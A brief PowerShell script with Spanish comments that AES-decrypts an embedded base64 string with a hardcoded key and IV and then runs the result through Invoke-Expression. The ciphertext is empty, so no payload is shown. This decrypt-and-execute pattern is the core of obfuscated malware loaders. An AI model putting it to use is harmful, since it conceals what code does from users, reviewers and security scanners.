# Texto encriptado (de la parte de encriptaci√≥n)
$encryptedText = ""

# Convertir de base64 a bytes
$encryptedBytes = [Convert]::FromBase64String($encryptedText)

# Usar la clave y el IV generados
$key = [Convert]::FromBase64String("1Iuc2VP16n4kpxXp6wRpFPa8FpEq8aExd1hPj53Rur0=")
$iv = [Convert]::FromBase64String("mGhRj7jYc6C0Aji0lD0cNA==")

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv

$decryptor = $aes.CreateDecryptor()
$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

# Convertir a string
$decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

# Ejecutar el c√≥digo desencriptado
Invoke-Expression $decryptedText
